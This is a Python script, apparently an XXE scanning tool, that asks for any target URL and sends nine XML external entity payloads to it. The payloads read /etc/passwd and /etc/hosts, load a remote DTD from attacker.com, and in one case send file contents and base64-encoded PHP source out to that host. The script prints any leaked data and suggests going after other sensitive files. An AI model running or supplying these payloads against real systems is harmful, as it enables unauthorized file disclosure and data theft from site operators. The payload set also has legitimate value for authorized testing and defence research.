import requests
import sys

# Function to test XXE vulnerability with multiple payloads
def test_xxe_vulnerability(url):
    try:
        print("\033[94m[*] Sending test payloads to detect XXE vulnerability...\033[0m")
        
        # Define multiple XML payloads with different external entities
        payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://attacker.com/xxe.txt">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY ret SYSTEM "php://filter/convert.base64-encode/resource=index.php"><!ENTITY data "<!ENTITY exfil SYSTEM \'http://attacker.com/?%xxe;%ret;\'>"> %data; %exfil; %data;]>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%int;%send;]>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % d SYSTEM "http://attacker.com/evil.dtd">%d;]>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%int;%send;]>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % data SYSTEM "http://attacker.com/evil.dtd">%data;%send;]>',
            '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>'
        ]
        
        # Iterate over each payload and send a POST request
        for index, payload in enumerate(payloads, start=1):
            print("\033[94m[*] Sending Payload", index, "...\033[0m")
            response = requests.post(url, data=payload)
            print("\033[94m[*] Request sent to:", response.url, "\033[0m")
            
            # Check if the response contains any sensitive information
            if 'root:' in response.text:
                print("\033[91m[!] The target website is vulnerable to XXE!\033[0m")
                print("\033[91m[!] Sensitive information retrieved for Payload", index, ":\n", response.text, "\033[0m")
            else:
                print("\033[92m[*] Payload", index, "did not reveal any sensitive information.\033[0m")
        
        # Show how to test the vulnerability further
        print("\n\033[94m[>] To test the vulnerability further, try modifying the XML payload to access other sensitive files or external entities.\033[0m")
        
    except Exception as e:
        print("\033[91m[!] An error occurred while testing for XXE vulnerability:", e, "\033[0m")

# Main function
def main():
    try:
        # Ask for the target website URL
        target_url = input("\033[95mEnter your target website URL: \033[0m")
        
        print("\033[94m[*] Testing for XXE vulnerability in:", target_url, "\033[0m")
        
        # Test for XXE vulnerability
        test_xxe_vulnerability(target_url)
        
    except KeyboardInterrupt:
        print("\n\033[91m[!] Keyboard Interrupt detected. Exiting...\033[0m")
        sys.exit(0)

if __name__ == "__main__":
    main()
